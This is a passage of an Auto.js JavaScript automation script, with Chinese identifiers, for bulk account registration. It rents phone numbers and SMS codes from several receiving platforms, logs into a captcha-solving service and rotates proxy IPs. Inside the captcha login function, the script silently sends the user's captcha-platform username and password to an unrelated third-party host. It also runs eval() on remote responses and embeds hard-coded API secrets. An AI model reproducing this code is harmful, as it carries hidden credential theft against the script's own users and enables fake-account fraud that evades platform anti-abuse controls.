                存储.put("jmmm", ui.jmmm.text()) //登录成功了就存储账号
                logstr("当前打码平台为【他信】丨登录成功√")

                var r = 登录.split("|")[2]
                logstr("余额:" + r);
            } else {
                logstr("登录失败:" + 登录.split("|")[1])
            }

            接受token.setAndNotify(jmtoken);
        }

        if (现行中 == 2) {
            var 德芙dl = http.get("http://api.weilai.best/login?username=" + jmzh + "&password=" + jmmm).body.json();
            // log(德芙dl)
            if (德芙dl.code == "ok") {
                token = 德芙dl.token
                存储.put("jmzh", ui.jmzh.text()) //登录成功了就存储账号
                存储.put("jmmm", ui.jmmm.text()) //登录成功了就存储账号
                var 德芙dl = http.get('http://api.weilai.best/getmoney?token=' + token).body.json();
                logstr("登录成功|余额" + 德芙dl.money)

            } else {
                logstr("请检查是否api账号，或密码错误")
            }
            接受token.setAndNotify(token)

        }
        if (现行中 == 3) {
            var 德芙dl = http.get("http://api.sqhyw.net:81/api/logins?username=" + jmzh + "&password=" + jmmm).body.json();
            //log(德芙dl)
            if (德芙dl.message == "登录成功") {
                token = 德芙dl.token
                存储.put("jmzh", ui.jmzh.text()) //登录成功了就存储账号
                存储.put("jmmm", ui.jmmm.text()) //登录成功了就存储账号
                var 德芙dl = http.get('http://api.sqhyw.net:81/api/get_myinfo?token=' + token).body.json();
                logstr("登录成功👌|余额" + 德芙dl.data[0].money)

            } else {
                logstr("请检查是否api账号，或密码错误")
            }
            接受token.setAndNotify(token)

        }

        if (现行中 == 4) {
            var 德芙dl = http.get("http://api.haozhuma.com/sms/?api=login&user=" + jmzh + "&pass=" + jmmm).body.json();
            // log(德芙dl)
            if (德芙dl.msg == "success") {
                token = 德芙dl.token
                存储.put("jmzh", ui.jmzh.text()) //登录成功了就存储账号
                存储.put("jmmm", ui.jmmm.text()) //登录成功了就存储账号
                var 德芙dl = http.get("http://api.haozhuma.com/sms/?api=getSummary&token=" + token).body.json();
                //log(德芙dl)
                logstr("登录成功👌|余额" + 德芙dl.money)

            } else {
                logstr("请检查是否api账号，或密码错误")
            }
            接受token.setAndNotify(token)

        }



        if (现行中 == 0) {
            try {
                var 登录 = http.get("http://www.sanyangshare.com:9094/api/v1/login?username=" + jmzh + "&password=" + jmmm).body.json();
                //log(登录)
                if (登录.msg == "success") {
                    logstr("当前接码平台为【山羊】丨登录成功√")
                    var token = 登录.data.token;
                    var jmtoken = token;
                    存储.put("jmzh", ui.jmzh.text()) //登录成功了就存储账号
                    存储.put("jmmm", ui.jmmm.text()) //登录成功了就存储账号
                    logstr("余额:" + 登录.data.balance)
                } else {
                    logstr("登录失败:" + 登录.message)
                };

                接受token.setAndNotify(jmtoken);
            } catch (e) {
                logstr("登录失败:检查平台是否卡顿或者平台已跑路!")
            }
        }
    };
    //************打码登录************
    ui.dmdl.click(function() {
        threads.start(function() {
            中选 = ui.dmpt.getSelectedItemPosition() //优质IP
            var 联众平台 = ui.dmpt.getSelectedItemPosition();
            var 联众账号 = ui.dmzh.text();
            var 联众密码 = ui.dmmm.text();
            存储.put("dmzh", ui.dmzh.text()) //登录成功了就存储账号
            存储.put("dmmm", ui.dmmm.text()) //登录成功了就存储账号
            打码登录(中选, 联众账号, 联众密码)
        })
    })

    function 打码登录(中选, 联众账号, 联众密码) {
        if (中选 == 0) {
            var temp = http.get('http://iapp.vipyshy.com/tal/dyxt.php?admin=227374467&zh=联众账号' + 联众账号 + '&mm=联众密码' + 联众密码, {
                "headers": {}
            }).body.string();
            logstr("当前打码平台为【联众】");
            //var 时间戳 = new Date().getTime();去当前时间戳
            var 接口地址 = "https://v2-api.jsdama.com/check-points"
            var 检查点数 = http.postJson(接口地址, {
                softwareId: "18001",
                softwareSecret: "PhDMdaD04wRSQQwGktBrpIfPKrN7Ee1dR72Jaeag",
                username: 联众账号,
                password: 联众密码
            }, {
                headers: {
                    'Host': 'v2-api.jsdama.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '298',
                    'Accept': 'application/json, text/javascript, ; q=0.01',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; letv x501 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36',
                    'Content-Type': 'text/json',
                }
            }).body.json()
            if (检查点数.code == 0) {
                logstr("登陆成功-可用点数为：" + 检查点数.data.availablePoints);

            } else if (检查点数.code == 10083006) {
                logstr("用户密码错误，请检查账号密码");
            } else if (检查点数.code == 10147006) {
                logstr("账号未注册");
            } else {
                logstr("用户账号密码错误");

            }
        }
    };

    function 获取手机号(现行中, xmid, token) {
        if (现行中 == 0) {
            var r = http.get("http://www.sanyangshare.com:9094/api/v1/getphonenumber?token=" + token + "&projectId=" + xmid).body.json();
            //  log(r)
            if (r.msg == "success") {
                var 手机号 = r.data[0].mobileNo
                return r

            } else {
                log(r)
                return -1;
            }
        } //德芙云判断
        if (现行中 == 2) {
            var 米云qh = http.get("http://api.weilai.best/getphone?token=" + token + "&id=" + xmid + "&rd=am6666&operator=1").body.json();
            // log(米云qh)
            if (米云qh.code == "ok") {
                var 手机号 = 米云qh.phone;
                return 米云qh;
            } else {
                log(米云qh)
                return -1;
            }


        }
        if (现行中 == 4) {
            var 米云qh = http.get('http://api.haozhuma.com/sms/?api=getPhone&token=' + token + '&sid=' + xmid + '&country_code=CN&ascription=0&author=langqi666').body.json();
            // log(米云qh)
            if (米云qh.code == 0) {
                var 手机号 = 米云qh.phone;
                return 手机号;
            } else {
                log(米云qh)
                return -1;
            }


        }
        if (现行中 == 3) {
            var 米云qh = http.get("http://api.sqhyw.net:81/api/get_mobile?token=" + token + "&operator=4&api_id=451492&scope_black=192&project_id=" + xmid).body.json();
            // log(米云qh)
            if (米云qh.message == "ok") {
                var 手机号 = 米云qh.mobile
                return 手机号
            } else {
                log(米云qh)
                return -1;
            }


        }
        if (现行中 == 1) {
            var r = http.get("http://api.my531.com/GetPhone/?token=" + token + "&id=" + xmid).body.string();
            log(r)
            if (r.split("|")[0] == 1) {
                var 手机号 = r.split("|")[1]
                return 手机号;
            } else {
                return -1;
            }
        } //亿通码判断

    }

    function 获取验证码(现行中, 手机号, xmid, token, mid, mid1) {
        if (现行中 == 0) {
            for (var i = 1; i < 10; i++) {
                var qm = http.get("http://www.sanyangshare.com:9094/api/v1/getsms?token=" + token + "&mid=" + mid).body.json();
                if (qm.msg == "success") {
                    var yzm = qm.data.SMS.split("，10")[0].split("是")[1]
                    logstr("短信获取成功！👌" + yzm)
                    return yzm;
                } else {
                    logstr("短信尚未到达，请耐心等待")
                    sleep(6000)
                }
            }
            return 1
        }
        if (现行中 == 2) {
            for (var a = 1; a < 5; a++) {
                var 德芙dx = http.get("http://api.weilai.best/getmessage?token=" + token + "&requestid=" + mid).body.json();
                log(德芙dx)
                if (德芙dx.state == "短信到达") {
                    var yzm = 德芙dx.sms.split("，10")[0].split("是")[1]
                    return yzm;

                } else {
                    logstr("短信尚未到达，请耐心等待！")
                    gx("✔", "", 手机号, "获取验证码中[" + a + "/5]", "")

                    sleep(12000)
                }
            }
            return 1;

        }

        if (现行中 == 4) {
            for (var a = 1; a < 5; a++) {
                var 德芙dx = http.get('http://api.haozhuma.com/sms/?api=getMessage&token=' + token + '&sid=' + xmid + '&country_code=CN&phone=' + 手机号).body.json();
                // log(德芙dx)
                if (德芙dx.code == 0) {
                    var yzm = 德芙dx.yzm
                    return yzm;

                } else {
                    logstr("短信尚未到达，请耐心等待！")
                    gx("✔", "", 手机号, "获取验证码中[" + a + "/5]", "")

                    sleep(12000)
                }
            }
            return 1;

        }


        if (现行中 == 3) {
            for (var a = 1; a < 5; a++) {
                var 德芙dx = http.get("http://api.sqhyw.net:81/api/get_message?token=" + token + "&api_id=451492&project_id=" + xmid + "&phone_num=" + 手机号).body.json();
                //log(德芙dx)
                if (德芙dx.message == "ok") {
                    var yzm = 德芙dx.code
                    logstr("短信获取成功！👌" + yzm)
                    return yzm;

                } else {
                    logstr("短信尚未到达，请耐心等待！")
                    gx("✔", "", 手机号, "获取验证码中[" + a + "/5]", "")

                    sleep(12000)
                }
            }
            return 1;

        }

        if (现行中 == 1) {
            for (var i = 1; i < 10; i++) {
                var qm = http.get("http://api.my531.com/GetMsg/?token=" + token + "&id=" + xmid + "&dev=am6666&phone=" + 手机号).body.string();
                var s = qm.split("|")[0]
                if (s == 1) {
                    // log(qm)
                    var qm1 = qm.split("|")[1]
                    var yzm = qm1.split(",如")[0].split("码是:")[1]
                    logstr("短信获取成功！👌" + yzm)
                    gx("✔", "", 手机号, yzm, "")
                    return yzm;
                } else {
                    gx("✔", "", 手机号, "获取验证码中[" + i + "/10]", "")
                    logstr("短信尚未到达，请耐心等待")
                    sleep(5000)
                }
            }
            return 1
        }
    }

    function 虚拟IP() {
        var getIp_api = http.get('http://pv.sohu.com/cityjson?ie=utf-8');
        var InetIP = getIp_api.body.string();
        eval(InetIP);
        logstr("当前IP:" + returnCitySN.cip);
        for (let i = 0; i < 1; i++) {
            var getip = http.get("http://www.nimadaili.com/api/?uuid=e52939e9fa7749c4b559101b4214b83d&num=1&yunyinshang=全部&place=中国&category=3&protocol=0&sortby=0&repeat=1&format=3&position=1%3D%25CC%25E1%2B%2B%25C8%25A1").body.string().split(":")[0];
            logstr("获取后的IP为:" + getip);
        }
    }

    function 熊猫(zw) {
        try {
            function xdaili_youzhi(zw) {
                //存储.put("sp", ui.sp.text()) //登录成功了就存储账号
                //eval  
                // 查询自己IP地址: http://pv.sohu.com/cityjson?ie=utf-8'
                function httpProxy(url, prot) {
                    存储.put("zw", ui.sp.text()) //登录成功了就存储账号
                    var Proxy = java.net.Proxy;
                    var InetSocketAddress = java.net.InetSocketAddress;
                    var okhttp = new Packages.okhttp3.OkHttpClient.Builder().proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(url, prot)));
                    http.__okhttp__.muteClient(okhttp);
                };
                var IP = http.get("http://pv.sohu.com/cityjson?ie=utf-8").body.string();
                eval(IP);
                var getIP = http.get(zw).body.string();
                //logstr(getIP);
                //114.239.29.225:23308
                //split(特殊符号)
                var aa = getIP.split(":")[0];
                //logstr(aa);
                var bb = parseInt(getIP.split(":")[1]); //一定要转换数字
                //logstr(bb);
                httpProxy(aa, bb);
                var IP = http.get("http://pv.sohu.com/cityjson?ie=utf-8").body.string();
                eval(IP);
                logstr("更换后IP为:" + returnCitySN.cip);
            }
            xdaili_youzhi(zw)
        } catch (e) {
            logstr(e)
            logstr("ip错误")
            canclhttpProxy()
        }
    }

    function 浪七代理(zw) {
        try {
            canclhttpProxy()
            var zw = ui.sp.text()
            var getIp_api = http.get('http://pv.sohu.com/cityjson?ie=utf-8');
            var InetIP = getIp_api.body.string();
            eval(InetIP);
            logstr("当前IP:" + returnCitySN.cip);
            存储.put("zw", ui.sp.text()) //登录成功了就存储账号
            for (let i = 0; i < 3; i++) {
                var xmUrl = "http://daili.skykey.club/api/?type=http&token=" + zw + "&Number=1&Format=json&author=langqi666"
                var getProxy_json = http.get(xmUrl).body.json();
                if (getProxy_json.code == 0) {
                    var IP地址 = getProxy_json.obj[0].ip;
                    var 端口号 = getProxy_json.obj[0].port;
                    var 数字类型转换 = parseInt(端口号); //转换数据为数字类型

                    httpProxy(IP地址, 数字类型转换);
                    var getIp_api = http.get('http://pv.sohu.com/cityjson?ie=utf-8');
                    var InetIP = getIp_api.body.string();
                    eval(InetIP);
                    logstr("获取的IP:" + returnCitySN.cip);
                    break;
                } else {
                    canclhttpProxy()
                    logstr("未取到ip，三秒后重试。");
                    sleep(3000);
                }
            }
        } catch (e) {
            logstr(e)
            logstr("ip错误")
            canclhttpProxy()
        }

    }

    var 存储 = storages.create("软件"); //链接存储内容
    var 内容jmzh = 存储.get("jmzh")
    var 内容jmmm = 存储.get("jmmm")
    var 内容dmzh = 存储.get("dmzh")
    var 内容dmmm = 存储.get("dmmm")
    var 内容sp = 存储.get("zw")
    if (内容sp) {
        ui.sp.setText(内容sp)
    };
    if (内容jmmm) {
        ui.jmmm.setText(内容jmmm)
    };
    if (内容jmzh) {
        ui.jmzh.setText(内容jmzh)
    };
    if (内容dmmm) {
        ui.dmmm.setText(内容dmmm)
    };
    if (内容dmzh) {
        ui.dmzh.setText(内容dmzh)
    };

} //跳转到注册页面最后一个括号
// 当前脚本来自于http://script.345yun.cn脚本库下载！